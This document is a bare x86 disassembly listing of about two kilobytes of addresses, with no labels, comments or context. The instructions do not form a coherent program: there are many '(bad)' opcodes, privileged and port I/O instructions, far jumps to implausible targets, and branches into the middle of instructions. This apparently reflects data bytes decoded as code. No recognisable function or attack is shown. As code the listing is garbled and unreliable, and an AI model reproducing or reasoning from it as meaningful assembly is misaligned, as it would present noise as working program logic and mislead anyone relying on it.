  4193a5:	sbb    eax,edi
  4193a7:	lea    esi,[ecx-0x49]
  4193aa:	les    esp,FWORD PTR [esi+0x4b]
  4193ad:	jbe    0x419358
  4193af:	xlat   BYTE PTR ds:[ebx]
  4193b0:	mov    dl,0xe7
  4193b2:	add    edi,DWORD PTR [esi]
  4193b4:	adc    bl,BYTE PTR [esi+0x37]
  4193b7:	jae    0x419361
  4193b9:	fild   DWORD PTR [ebp+0x7b7abc55]
  4193bf:	jmp    0x41938f
  4193c1:	es popa 
  4193c3:	les    ebx,FWORD PTR [ecx]
  4193c5:	cdq    
  4193c6:	xchg   esi,eax
  4193c7:	call   0x97f36990
  4193cc:	iret   
  4193cd:	jne    0x4193b2
  4193cf:	(bad)  
  4193d0:	cwde   
  4193d1:	mov    ebx,0xf736e9fb
  4193d6:	mov    dl,0xb
  4193d8:	jno    0x419401
  4193da:	arpl   WORD PTR [edx+edx*4-0x10],di
  4193de:	dec    ebp
  4193df:	mov    ch,0xa6
  4193e1:	jmp    0x4193de
  4193e3:	xlat   BYTE PTR ds:[ebx]
  4193e4:	(bad)  
  4193e5:	mov    eax,0x9e1913ad
  4193ea:	or     al,0x90
  4193ec:	pop    eax
  4193ed:	cmp    BYTE PTR [edi],ch
  4193ef:	ja     0x4193e3
  4193f1:	ds inc edi
  4193f3:	xchg   ebp,eax
  4193f4:	inc    ebx
  4193f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193f6:	bound  edx,QWORD PTR [edi+esi*4]
  4193f9:	push   ss
  4193fa:	push   cs
  4193fb:	mov    ecx,0xb24239b0
  419400:	es xor edi,eax
  419403:	out    dx,al
  419404:	xlat   BYTE PTR ds:[ebx]
  419405:	pushf  
  419406:	mov    bh,0xcd
  419408:	icebp  
  419409:	mov    ebp,0x83680f77
  41940e:	imul   ebp,ecx,0x5a8ac31e
  419414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419415:	mov    ah,0xc1
  419417:	jle    0x41942a
  419419:	adc    ecx,edi
  41941b:	fsubr  DWORD PTR [edi+0x316877e7]
  419421:	imul   DWORD PTR [eax-0x4fd9bc30]
  419427:	fcmove st,st(5)
  419429:	and    BYTE PTR [edi+0x1dec27f1],ah
  41942f:	ja     0x419419
  419431:	adc    BYTE PTR [esi+0x1773453c],cl
  419437:	enter  0x2e18,0xfe
  41943b:	add    eax,0xcfcd7850
  419440:	jg     0x419418
  419442:	hlt    
  419443:	cmc    
  419444:	sub    BYTE PTR [esi],al
  419446:	xlat   BYTE PTR ds:[ebx]
  419447:	ja     0x4194a5
  419449:	addr16 cmp al,0xd0
  41944c:	bound  edx,QWORD PTR ds:0x5cdcd9a
  419452:	xchg   edx,eax
  419453:	mov    WORD PTR fs:0x974e29df,fs
  41945a:	inc    ebx
  41945b:	and    BYTE PTR [ecx],ah
  41945d:	imul   edi,DWORD PTR [esi+eax*1],0x8e55caac
  419464:	leave  
  419465:	in     al,0xfa
  419467:	push   0x38
  419469:	xchg   cl,al
  41946b:	lock sbb esp,DWORD PTR [edi-0x2c]
  41946f:	and    esi,DWORD PTR [eax+edi*2]
  419472:	into   
  419473:	iret   
  419474:	and    edx,ecx
  419476:	fimul  DWORD PTR [ebx+0x5c818cf5]
  41947c:	cli    
  41947d:	data16 cmp BYTE PTR [edi-0x75],cl
  419481:	cs jge 0x4194f6
  419484:	push   ds
  419485:	sahf   
  419486:	mov    cl,0xf1
  419488:	icebp  
  419489:	js     0x41947e
  41948b:	(bad)  
  41948c:	out    dx,eax
  41948d:	and    al,0x81
  41948f:	push   gs
  419491:	mov    ebx,0x76c556b1
  419496:	and    edi,DWORD PTR [ebx+0x43581ecd]
  41949c:	add    dl,ah
  41949e:	push   edi
  41949f:	pop    esi
  4194a0:	or     cl,0x92
  4194a3:	add    DWORD PTR [eax+0xd001c3d],ebx
  4194a9:	add    DWORD PTR [ebp+esi*1+0x70],0x78
  4194ae:	arpl   bx,sp
  4194b0:	in     al,dx
  4194b1:	inc    esi
  4194b2:	test   al,0xda
  4194b4:	scas   al,BYTE PTR es:[edi]
  4194b5:	mov    ss:0x69b57c78,eax
  4194bb:	call   0xaad3cec
  4194c0:	stc    
  4194c1:	in     eax,dx
  4194c2:	retf   0x90ee
  4194c5:	mov    dh,0x32
  4194c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c8:	arpl   WORD PTR [ebx+0x1d],di
  4194cb:	leave  
  4194cc:	pop    esp
  4194cd:	mov    ds:0xb6f111e8,eax
  4194d2:	popa   
  4194d3:	aaa    
  4194d4:	retf   0x2b58
  4194d7:	aas    
  4194d8:	xlat   BYTE PTR ds:[ebx]
  4194d9:	ret    0xca0a
  4194dc:	pop    eax
  4194dd:	int    0xa4
  4194df:	js     0x4194c9
  4194e1:	clc    
  4194e2:	push   ecx
  4194e3:	out    dx,al
  4194e4:	out    dx,eax
  4194e5:	inc    ecx
  4194e6:	ret    0x1af9
  4194e9:	xchg   edi,eax
  4194ea:	or     BYTE PTR [edi],0x36
  4194ed:	sahf   
  4194ee:	jecxz  0x419546
  4194f0:	push   ss
  4194f1:	mov    ds:0x318cc53e,eax
  4194f6:	xchg   edi,eax
  4194f7:	or     DWORD PTR [ebp+0x15c09806],edi
  4194fd:	adc    eax,0x44dd6b0a
  419502:	retf   
  419503:	sbb    eax,ebx
  419505:	push   ds
  419506:	test   al,0xbe
  419508:	jbe    0x4194ab
  41950a:	retf   0x287c
  41950d:	and    eax,0xc8ed2d49
  419512:	repnz lods al,BYTE PTR ds:[esi]
  419514:	and    esp,eax
  419516:	test   BYTE PTR [ebx+0x4f],dh
  419519:	nop
  41951a:	pop    esi
  41951b:	call   0xe887:0x4e0c6581
  419522:	push   ecx
  419523:	ins    BYTE PTR es:[edi],dx
  419524:	in     eax,0xbd
  419526:	sbb    al,0xce
  419528:	std    
  419529:	or     al,0x7f
  41952b:	or     esi,DWORD PTR [ebp+0x7c0483cc]
  419531:	sub    al,0x91
  419533:	or     edx,DWORD PTR [ecx-0x35c4c552]
  419539:	scas   al,BYTE PTR es:[edi]
  41953a:	icebp  
  41953b:	jnp    0x41956f
  41953d:	sub    BYTE PTR [esi-0x778b7e61],cl
  419543:	pop    ds
  419544:	loop   0x419580
  419546:	retfw  
  419548:	dec    esi
  419549:	sub    DWORD PTR [esi-0x6c],ecx
  41954c:	sub    eax,0xf5e43a66
  419551:	out    0x83,eax
  419553:	xchg   esp,eax
  419554:	dec    esi
  419555:	and    BYTE PTR [edi],dl
  419557:	sbb    al,0x4b
  419559:	call   0x7e8a:0x7c9e59cd
  419560:	jb     0x4195d3
  419562:	or     eax,0xf2515de4
  419567:	mov    dl,0x9d
  419569:	fsub   st,st(7)
  41956b:	jo     0x419571
  41956d:	xchg   ebx,eax
  41956e:	std    
  41956f:	test   al,0xb
  419571:	icebp  
  419572:	repz stc 
  419574:	push   ss
  419575:	in     eax,0x92
  419577:	and    BYTE PTR es:[ebp+0x58916c2b],cl
  41957e:	lea    ebx,[ebx-0x44db704d]
  419584:	mov    esp,0x9b765507
  419589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41958a:	sti    
  41958b:	jl     0x4195d0
  41958d:	push   es
  41958e:	jmp    DWORD PTR [esi+eax*1]
  419591:	mov    dh,0x85
  419593:	call   0x56cfdef3
  419598:	es mov dl,al
  41959b:	out    0xf4,al
  41959d:	int    0xa0
  41959f:	imul   ebx,ebp,0xffffffa0
  4195a2:	mov    eax,ds:0x6529f1a5
  4195a7:	out    0xe,al
  4195a9:	jne    0x419623
  4195ab:	not    BYTE PTR [ebx+0x57409b5b]
  4195b1:	cld    
  4195b2:	imul   al
  4195b4:	sub    dl,BYTE PTR [ecx]
  4195b6:	xchg   ebp,eax
  4195b7:	xchg   DWORD PTR [ebx+0x62924600],edi
  4195bd:	ins    DWORD PTR es:[edi],dx
  4195be:	jne    0x4195bf
  4195c0:	jo     0x41956c
  4195c2:	lea    edx,[edi+0x39be8673]
  4195c8:	sub    eax,0x5d57f47b
  4195cd:	mov    dh,0x97
  4195cf:	js     0x419569
  4195d1:	xchg   BYTE PTR [esi+0x78],dh
  4195d4:	and    al,0x6
  4195d6:	mov    DWORD PTR [ecx+0x5e],ebx
  4195d9:	fcos   
  4195db:	jle    0x4195aa
  4195dd:	loop   0x4195e9
  4195df:	fsubr  st(3),st
  4195e1:	pop    ebx
  4195e2:	dec    ebp
  4195e3:	push   ss
  4195e4:	cmp    eax,0xaab8df9b
  4195e9:	ss fs mov dh,0xea
  4195ed:	daa    
  4195ee:	test   BYTE PTR [ecx],bl
  4195f0:	pop    esp
  4195f1:	test   eax,0x43aef5e0
  4195f6:	and    DWORD PTR [ebx],ebp
  4195f8:	pop    ds
  4195f9:	mov    bl,BYTE PTR [edx]
  4195fb:	jnp    0x419621
  4195fd:	mov    DWORD PTR [esi+0x5d],0xcf521620
  419604:	jmp    0xc52a:0x6e9afb84
  41960b:	out    0x7b,ax
  41960e:	nop
  41960f:	dec    ebp
  419610:	fnstenv [eax]
  419612:	shl    BYTE PTR [edx-0x2e290c45],1
  419618:	mov    ds:0x8afa6df7,eax
  41961d:	jle    0x419692
  41961f:	cdq    
  419620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419621:	repz jp 0x419630
  419624:	sub    eax,0xe335a77d
  419629:	jmp    0x98a1ac71
  41962e:	ror    DWORD PTR [esi-0x75],cl
  419631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419632:	dec    edx
  419633:	in     al,dx
  419634:	jo     0x419676
  419636:	xchg   BYTE PTR [edi],bh
  419638:	out    0xf8,al
  41963a:	cmp    ebx,DWORD PTR [ebp+0x32c536b7]
  419640:	mov    ds:0x7a75c25c,al
  419645:	pop    esi
  419646:	push   ds
  419647:	lods   eax,DWORD PTR ds:[esi]
  419648:	sbb    DWORD PTR es:[esi],edx
  41964b:	xchg   edx,eax
  41964c:	add    ah,BYTE PTR [eax-0x10]
  41964f:	out    dx,eax
  419650:	pop    es
  419651:	mov    WORD PTR [edi+0x36],ss
  419654:	dec    esi
  419655:	inc    edx
  419656:	and    BYTE PTR [eax],cl
  419658:	or     BYTE PTR [edi-0xc22a17f],dl
  41965e:	jb     0x41965d
  419660:	jnp    0x41969e
  419662:	xor    eax,0x9d93cbdf
  419667:	jecxz  0x41965f
  419669:	fwait
  41966a:	(bad)  
  41966b:	jae    0x41960e
  41966d:	imul   ebp,DWORD PTR [eax-0x7165caf],0x3
  419674:	push   es
  419675:	mov    ah,0x1
  419677:	sub    al,0x1c
  419679:	into   
  41967a:	repz xor BYTE PTR [edi-0x7e1c649],bh
  419681:	std    
  419682:	mov    ah,dl
  419684:	sbb    eax,0xa
  419687:	push   edi
  419688:	in     eax,0xa8
  41968a:	xchg   ebp,eax
  41968b:	dec    eax
  41968c:	mov    al,BYTE PTR [ebp-0x2e]
  41968f:	jo     0x4196ca
  419691:	int3   
  419692:	pop    eax
  419693:	call   0x86f2:0x650e8873
  41969a:	mov    eax,ds:0x40b9b6c6
  41969f:	dec    ebx
  4196a0:	pusha  
  4196a1:	push   0x58
  4196a3:	out    0x72,al
  4196a5:	sti    
  4196a6:	sbb    al,0xc
  4196a8:	xor    edx,DWORD PTR [ebp-0x1f]
  4196ab:	pop    edx
  4196ac:	mov    esi,?
  4196ae:	jp     0x41963c
  4196b0:	jb     0x41967d
  4196b2:	mov    dh,0x79
  4196b4:	mov    dh,0xf6
  4196b6:	inc    edi
  4196b7:	hlt    
  4196b8:	imul   ebx,edi,0x54
  4196bb:	sub    ah,dh
  4196bd:	and    bh,BYTE PTR ds:0x81373376
  4196c3:	push   esi
  4196c4:	lahf   
  4196c5:	push   cs
  4196c6:	cld    
  4196c7:	push   0xffffffc5
  4196c9:	aam    0x9d
  4196cb:	push   ss
  4196cc:	sbb    DWORD PTR [ecx-0x21],esi
  4196cf:	pop    ebx
  4196d0:	cwde   
  4196d1:	push   edx
  4196d2:	movhps xmm7,QWORD PTR [ebx-0x4ae5c864]
  4196d9:	stc    
  4196da:	xchg   ebx,eax
  4196db:	fldenv [edx+0x6b034d11]
  4196e1:	call   0xa702bf74
  4196e6:	mov    cl,0xd8
  4196e8:	scas   eax,DWORD PTR es:[edi]
  4196e9:	cld    
  4196ea:	inc    esp
  4196eb:	xor    esp,esi
  4196ed:	mov    ebp,0xf7fd1ea8
  4196f2:	add    DWORD PTR [ebx],0xfffffffe
  4196f5:	clc    
  4196f6:	jb     0x41976c
  4196f8:	(bad)  
  4196f9:	(bad)  
  4196fb:	inc    ecx
  4196fc:	mov    ebp,0xbb195f61
  419701:	mov    ebx,0x271ebcba
  419706:	je     0x419701
  419708:	int    0xad
  41970a:	dec    ebx
  41970b:	dec    edx
  41970c:	bound  ecx,QWORD PTR [edi-0x6c]
  41970f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419710:	ins    DWORD PTR es:[edi],dx
  419711:	mov    al,0xc0
  419713:	sar    BYTE PTR [edi-0x37],1
  419716:	push   esi
  419717:	retf   
  419718:	scas   al,BYTE PTR es:[edi]
  419719:	fst    QWORD PTR [edi+0x70]
  41971c:	xchg   BYTE PTR [ecx-0x35],bl
  41971f:	pop    esp
  419720:	data16 mov bl,0x63
  419723:	mov    edx,0x47ff4b5d
  419728:	(bad)  
  419729:	or     eax,0xe1710cb1
  41972e:	cli    
  41972f:	and    DWORD PTR [edx+0x58a6df59],eax
  419735:	jno    0x419795
  419737:	or     edx,DWORD PTR [edx+edi*2]
  41973a:	fs addr16 add eax,0xe5fc094f
  419741:	xchg   edx,eax
  419742:	shl    ebx,0xea
  419745:	(bad)  
  419746:	sbb    bh,BYTE PTR [edx+0x5be7b94a]
  41974c:	pop    eax
  41974d:	add    eax,ebp
  41974f:	and    ah,cl
  419751:	(bad)  
  419752:	int3   
  419753:	jae    0x41978a
  419755:	ror    DWORD PTR [edi-0x1efed811],0x9
  41975c:	ins    DWORD PTR es:[edi],dx
  41975d:	cs mov edi,0x32a99c1
  419763:	jle    0x41975f
  419765:	fist   WORD PTR [edx]
  419767:	test   al,0xd5
  419769:	ficom  WORD PTR [ebp+0x40]
  41976c:	mov    ecx,0x8bff8f91
  419771:	mov    bh,BYTE PTR [eax+0x41]
  419774:	inc    edx
  419775:	fdivr  st,st(4)
  419777:	test   DWORD PTR ds:[esi-0x5e349c65],esi
  41977e:	into   
  41977f:	jbe    0x4197d4
  419781:	xchg   esi,eax
  419782:	or     al,BYTE PTR ds:0x2c5d821b
  419788:	cwde   
  419789:	lock sbb BYTE PTR [edi+0x104c8f3a],bh
  419790:	mov    dl,0xf6
  419792:	retf   
  419793:	or     ebx,ebx
  419795:	jge    0x4197c4
  419797:	adc    ecx,ebx
  419799:	add    BYTE PTR [edx+0x7a98f56d],0xd7
  4197a0:	sbb    DWORD PTR [edi-0x69],edx
  4197a3:	lods   al,BYTE PTR ds:[esi]
  4197a4:	out    0xd0,al
  4197a6:	ins    DWORD PTR es:[edi],dx
  4197a7:	or     eax,0x6495ef10
  4197ac:	rcl    BYTE PTR [ecx+edi*2+0x1f1e2888],1
  4197b3:	retf   
  4197b4:	call   DWORD PTR [ebx-0x58]
  4197b7:	or     al,0xf0
  4197b9:	nop
  4197ba:	cdq    
  4197bb:	pop    eax
  4197bc:	sar    BYTE PTR [ebp-0x36],0x4f
  4197c0:	mov    ah,dl
  4197c2:	push   ebp
  4197c3:	push   eax
  4197c4:	add    BYTE PTR [ebx+eiz*4],0xa3
  4197c8:	or     ah,ah
  4197ca:	dec    ebp
  4197cb:	dec    ebx
  4197cc:	rol    DWORD PTR [edx],cl
  4197ce:	sbb    al,0x4
  4197d0:	inc    ebp
  4197d1:	sub    al,0x46
  4197d3:	mov    ah,0x67
  4197d5:	jne    0x41981a
  4197d7:	push   ds
  4197d8:	sahf   
  4197d9:	xchg   ebp,eax
  4197da:	int    0xc1
  4197dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197dd:	loopne 0x41978d
  4197df:	(bad)  
  4197e1:	popa   
  4197e2:	xchg   eax,eax
  4197e4:	addr16 dec eax
  4197e6:	mov    DWORD PTR [esi],esi
  4197e8:	xchg   ebx,eax
  4197e9:	dec    ecx
  4197ea:	push   es
  4197eb:	shl    esp,1
  4197ed:	mov    eax,0x96c0ab6
  4197f2:	and    ah,BYTE PTR [edx+0x69]
  4197f5:	sub    edi,edx
  4197f7:	inc    edi
  4197f8:	sub    edi,DWORD PTR [esi]
  4197fa:	fucomp st(0)
  4197fc:	ret    0x2768
  4197ff:	mov    eax,0x4f86be2b
  419804:	dec    esi
  419805:	jbe    0x4197c5
  419807:	mov    esp,0xce337488
  41980d:	push   0x5c
  41980f:	cmc    
  419810:	mov    edi,0xadfd7f1f
  419815:	inc    edx
  419816:	sbb    al,0x9c
  419818:	sub    ebx,esp
  41981a:	sub    dh,bh
  41981c:	fdivr  QWORD PTR [ecx]
  41981e:	sub    al,0x9e
  419820:	or     ch,0xd8
  419823:	jo     0x419804
  419825:	(bad)  
  419826:	xor    al,ch
  419828:	retf   
  419829:	lock arpl WORD PTR [ebp+0x75],ax
  41982d:	pop    edx
  41982e:	imul   esp,DWORD PTR [eax+0x49],0x7b
  419832:	mov    eax,0x714596c7
  419837:	pop    eax
  419838:	rcr    BYTE PTR [edx+0x71],cl
  41983b:	not    DWORD PTR [ebx+0x7a2e1eb3]
  419841:	mov    ebp,0xab692a51
  419846:	cld    
  419847:	mov    edi,0x3ac99b6a
  41984c:	sub    BYTE PTR [eax+0x19],bh
  41984f:	mov    al,0xa
  419851:	test   al,0x3f
  419853:	mov    al,0xfb
  419855:	cdq    
  419856:	mov    edx,DWORD PTR [esi+0x1021500d]
  41985c:	cwde   
  41985d:	aad    0x28
  41985f:	cmp    BYTE PTR [ebx+0x1a60a57e],dl
  419865:	in     eax,dx
  419866:	inc    esp
  419867:	imul   edi,edx,0xffa39674
  41986d:	sbb    edi,DWORD PTR [ecx+0xa68c66a]
  419873:	cs mov ebx,0x5b5809f2
  419879:	cmp    BYTE PTR [eax-0x7a0c25c3],dh
  41987f:	or     BYTE PTR [ebx+0x2d],dh
  419882:	sbb    edx,eax
  419884:	or     BYTE PTR [edx+0x21],dh
  419887:	scas   al,BYTE PTR es:[edi]
  419888:	xchg   esp,eax
  419889:	popf   
  41988a:	outs   dx,BYTE PTR ds:[esi]
  41988b:	dec    ecx
  41988c:	xchg   ebp,eax
  41988d:	add    ebx,edi
  41988f:	leave  
  419890:	jns    0x419818
  419892:	dec    ebp
  419893:	mov    ah,0x8
  419895:	dec    ebx
  419896:	inc    ecx
  419897:	xchg   edi,eax
  419898:	popf   
  419899:	adc    eax,0x8efe529a
  41989e:	in     eax,0x10
  4198a0:	and    eax,0x669f4e9
  4198a5:	mov    cl,0xac
  4198a7:	sub    BYTE PTR [edi+0x538b970c],ch
  4198ad:	xor    al,0x21
  4198af:	out    0x49,eax
  4198b1:	call   0x8ac2:0x7b6e19b6
  4198b8:	sub    eax,0xd0807471
  4198bd:	xor    eax,0x9b711b73
  4198c2:	mov    esi,0x336be401
  4198c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198c8:	inc    ebx
  4198c9:	sub    al,0x88
  4198cb:	mov    BYTE PTR [edi],dh
  4198cd:	cmp    eax,0x42b05d7d
  4198d2:	mov    ch,0xf1
  4198d4:	je     0x4198e7
  4198d6:	data16 mov bh,0x6f
  4198d9:	xchg   esp,eax
  4198da:	and    BYTE PTR [esi-0x759182e9],bl
  4198e0:	inc    ebp
  4198e1:	ins    DWORD PTR es:[edi],dx
  4198e2:	mov    edi,ecx
  4198e4:	in     eax,0xcb
  4198e6:	cmp    ebx,DWORD PTR [ebx+edi*4]
  4198e9:	mov    DWORD PTR [ecx-0x4a32b1a5],ecx
  4198ef:	cli    
  4198f0:	ret    0x2b2
  4198f3:	out    0x3c,al
  4198f5:	retf   0xa43d
  4198f8:	inc    edx
  4198f9:	sub    eax,0x68b2aa9
  4198fe:	dec    ecx
  4198ff:	test   al,0xad
  419901:	loop   0x419922
  419903:	jmp    0x1948:0x8c422b14
  41990a:	fdiv   DWORD PTR [ebx-0x2a]
  41990d:	arpl   di,sp
  41990f:	xor    edx,DWORD PTR [ecx]
  419911:	aam    0x6b
  419913:	mov    edi,0x15eaa5af
  419918:	adc    eax,0x97af37b3
  41991d:	stos   BYTE PTR es:[edi],al
  41991e:	test   DWORD PTR [eax+ecx*4],edi
  419921:	cs jmp 0xf98ba433
  419927:	aaa    
  419928:	push   ebx
  419929:	sar    BYTE PTR [edx+0x5],cl
  41992c:	and    BYTE PTR [edx-0x27],ah
  41992f:	or     eax,0x32688263
  419934:	or     BYTE PTR [esi+0x58afe8ff],bl
  41993a:	or     ch,BYTE PTR ds:0x290ff14a
  419940:	sub    DWORD PTR [ecx],ebp
  419942:	cld    
  419943:	ret    0x5ccb
  419946:	scas   al,BYTE PTR es:[edi]
  419947:	push   es
  419948:	mov    esp,0x8b865cdd
  41994d:	out    dx,eax
  41994e:	mov    dh,0xc
  419950:	jg     0x4198dc
  419952:	pop    esi
  419953:	pop    edx
  419954:	inc    ecx
  419955:	dec    ecx
  419956:	xchg   BYTE PTR [ebx+0x31],dl
  419959:	jae    0x419993
  41995b:	out    0xb1,al
  41995d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41995e:	nop
  41995f:	push   eax
  419960:	lds    ebx,FWORD PTR [edx-0x422b448b]
  419966:	push   ebx
  419967:	sar    BYTE PTR [eax+ecx*1-0x65],1
  41996b:	mov    ds:0x2c5d3d30,eax
  419970:	adc    ecx,DWORD PTR [ecx-0x28]
  419973:	jl     0x4199a1
  419975:	sbb    al,0xba
  419977:	jns    0x4199f3
  419979:	sbb    ch,BYTE PTR [ecx-0x28]
  41997c:	inc    ecx
  41997d:	mov    ebx,0x994fed94
  419982:	push   ss
  419983:	cmp    ecx,DWORD PTR [eax]
  419985:	in     al,0xad
  419987:	xor    al,0x64
  419989:	in     al,0x7a
  41998b:	sbb    DWORD PTR [ebx],ebx
  41998d:	mov    edi,0xf627bb7
  419992:	jl     0x4199ca
  419994:	sbb    eax,eax
  419996:	ins    DWORD PTR es:[edi],dx
  419997:	arpl   WORD PTR [eax],dx
  419999:	adc    BYTE PTR [eax],bh
  41999b:	in     eax,dx
  41999c:	mov    eax,0x56e90ccb
  4199a1:	and    BYTE PTR [edi],dl
  4199a3:	sti    
  4199a4:	cwde   
  4199a5:	jb     0x419967
  4199a7:	hlt    
  4199a8:	enter  0x1bb5,0xfa
  4199ac:	cmc    
  4199ad:	push   cs
  4199ae:	and    bh,ch
  4199b0:	inc    edi
  4199b1:	dec    esi
  4199b2:	les    ebx,FWORD PTR [edi-0x1028194a]
  4199b8:	xor    cl,bh
  4199ba:	inc    eax
  4199bb:	cmp    al,0x1
  4199bd:	imul   esp,ecx,0x5b1b39ac
  4199c3:	lods   al,BYTE PTR ds:[esi]
  4199c4:	mov    eax,0x38289465
  4199c9:	in     al,0x35
  4199cb:	out    0x70,eax
  4199cd:	test   BYTE PTR [ebx+0x12],cl
  4199d0:	fdiv   QWORD PTR [edi+0x2214a618]
  4199d6:	mov    eax,ds:0x7bacc93b
  4199db:	or     eax,0x5e5ae49f
  4199e0:	or     DWORD PTR [ebx+0x34],ebx
  4199e3:	ins    DWORD PTR es:[edi],dx
  4199e4:	mov    bl,0x97
  4199e6:	mov    edi,0x70830780
  4199eb:	xor    esi,DWORD PTR [ebx-0x37]
  4199ee:	sbb    al,0x33
  4199f0:	test   DWORD PTR [eax+0x0],esi
  4199f3:	push   es
  4199f4:	mov    dh,BYTE PTR [ecx]
  4199f6:	or     DWORD PTR [eax-0x6f44f03a],ecx
  4199fc:	les    ecx,FWORD PTR [edi]
  4199fe:	retf   
  4199ff:	mov    ebp,0xbec1ad01
  419a04:	mov    dh,0x4b
  419a06:	sub    esp,DWORD PTR [eax]
  419a08:	daa    
  419a09:	add    DWORD PTR [esi],edx
  419a0b:	into   
  419a0c:	jnp    0x419a71
  419a0e:	mov    ah,0xbf
  419a10:	jecxz  0x419a3d
  419a12:	shl    DWORD PTR [edi+0x64],1
  419a15:	push   edi
  419a16:	dec    ebp
  419a17:	loopne 0x4199a8
  419a19:	cld    
  419a1a:	mov    al,ds:0xd7ee40ff
  419a1f:	stc    
  419a20:	pop    edi
  419a21:	jnp    0x419a04
  419a23:	fild   QWORD PTR [edx]
  419a25:	retf   
  419a26:	retf   
  419a27:	cli    
  419a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a29:	cli    
  419a2a:	or     bl,bh
  419a2c:	mov    ebx,0x84921a43
  419a31:	xor    dl,BYTE PTR [esi]
  419a33:	scas   eax,DWORD PTR es:[edi]
  419a34:	xchg   DWORD PTR [ecx],ebx
  419a36:	ins    BYTE PTR es:[edi],dx
  419a37:	pop    es
  419a38:	pushf  
  419a39:	fnstcw WORD PTR [edi+0x7d]
  419a3c:	inc    edx
  419a3d:	in     al,0x2b
  419a3f:	jmp    0x4199d5
  419a41:	(bad)  
  419a42:	ins    BYTE PTR es:[edi],dx
  419a43:	iret   
  419a44:	cld    
  419a45:	mov    bl,0x38
  419a47:	sbb    esi,ebp
  419a49:	fadd   st,st(7)
  419a4b:	repnz test eax,0x943a1e5f
  419a51:	mov    WORD PTR [eax-0x647466e9],ss
  419a57:	push   edi
  419a58:	or     al,0xf2
  419a5a:	sti    
  419a5b:	add    eax,0x5bb41d
  419a60:	mov    al,0x43
  419a62:	mov    ds:0x9fa05dc7,eax
  419a67:	or     ch,ch
  419a69:	fild   QWORD PTR [edx+0x162c136e]
  419a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a70:	lea    ebx,ds:0xe3f29287
  419a76:	adc    eax,0x789f35dd
  419a7b:	shl    DWORD PTR [edx+0x5d8bf3f0],1
  419a81:	icebp  
  419a82:	xor    eax,0x12d2ee9b
  419a87:	out    0x1e,al
  419a89:	loope  0x419a77
  419a8b:	mov    al,ds:0xd0834940
  419a90:	mov    WORD PTR [edi-0x4e],es
  419a93:	adc    eax,0x317a5c63
  419a98:	sub    DWORD PTR [edx+eax*2+0x6589cde5],ebx
  419a9f:	fisubr DWORD PTR [esp+edi*8-0xa]
  419aa3:	clc    
  419aa4:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419aa6:	cmp    eax,0x4d737d18
  419aab:	sub    bl,BYTE PTR [edi+edx*1+0x6c5a7512]
  419ab2:	pop    esp
  419ab3:	cdq    
  419ab4:	xor    BYTE PTR ds:0xe270636,0xfb
  419abb:	sbb    al,0x8d
  419abd:	in     eax,0x29
  419abf:	loope  0x419b14
  419ac1:	add    eax,ebx
  419ac3:	or     dh,BYTE PTR [esp+eax*2]
  419ac6:	lds    ebx,FWORD PTR ds:0xceca4fc2
  419acc:	jo     0x419a94
  419ace:	and    eax,DWORD PTR [eax-0x12]
  419ad1:	dec    ebp
  419ad2:	mov    al,0x64
  419ad4:	xor    BYTE PTR [ebp-0x6e75803],dl
  419ada:	(bad)  
  419adb:	or     eax,0x87d3106b
  419ae0:	xor    DWORD PTR [edi+0x7e28a8ce],esp
  419ae6:	push   ebx
  419ae7:	push   edi
  419ae8:	add    DWORD PTR [ecx-0x59e19bb3],0xffffffb4
  419aef:	sub    eax,DWORD PTR [edx]
  419af1:	mov    BYTE PTR ds:0xc1453223,cl
  419af7:	dec    eax
  419af8:	pop    eax
  419af9:	icebp  
  419afa:	or     eax,0x443dd6c7
  419aff:	add    BYTE PTR [eax+0x61ed9750],ch
  419b05:	jmp    FWORD PTR ds:0x899d65f9
  419b0b:	jp     0x419ab1
  419b0d:	push   ds
  419b0e:	imul   edx,DWORD PTR [eax+eax*1-0x64525424],0x76
  419b16:	cs retf 0x8c43
  419b1a:	and    esp,DWORD PTR [edx+0x58164d02]
  419b20:	jo     0x419af3
  419b22:	out    0x85,eax
  419b24:	or     eax,0xd9992971
  419b29:	pop    ss
  419b2a:	mov    eax,0x4835cd4b
  419b2f:	out    0x7b,eax
  419b31:	pushf  
  419b32:	mov    edi,0xcccfdc1e
  419b37:	jo     0x419ad5
  419b39:	dec    BYTE PTR [edx+0x5a]
  419b3c:	mul    BYTE PTR [eax-0x79]
  419b3f:	enter  0xc763,0x54
  419b43:	sbb    al,0x50
  419b45:	je     0x419ade
  419b47:	and    al,0x66
  419b49:	sub    eax,0x3ad7a1b0
  419b4e:	faddp  st(3),st
  419b50:	jns    0x419b56
  419b52:	retf   
  419b53:	xchg   DWORD PTR [ebx+eax*1-0x3a],edx
  419b57:	(bad)  
  419b58:	js     0x419b63
  419b5a:	cmp    eax,0xf55150c3
  419b5f:	sar    DWORD PTR [esi-0x1b],1
  419b62:	int3   
  419b63:	leave  
  419b64:	in     eax,0x53
  419b66:	and    BYTE PTR [edx],al
  419b68:	push   cs
  419b69:	(bad)  
  419b6b:	aam    0x85
  419b6d:	cmp    BYTE PTR [esi+0x5a2bf737],ch
  419b73:	stc    
  419b74:	scas   eax,DWORD PTR es:[edi]
  419b75:	popa   
  419b76:	mov    eax,0x13099265
  419b7b:	inc    esi
  419b7c:	hlt    
  419b7d:	and    al,0xf6
  419b7f:	mov    esi,0xecae27f6
  419b84:	hlt    
  419b85:	shr    BYTE PTR ds:[edx+0x49c23a28],1
  419b8c:	sub    al,0xac
  419b8e:	ror    DWORD PTR [edx],cl
  419b90:	cmp    edx,DWORD PTR [edi+0x3d]
  419b93:	popa   
  419b94:	inc    ebx
  419b95:	inc    esi
  419b96:	addr16 test al,0x7c
  419b99:	mov    ds:0xc279d06e,eax
  419b9e:	mov    bl,0x5f
  419ba0:	add    DWORD PTR [edx],esi
  419ba2:	enter  0x6dc6,0xd2
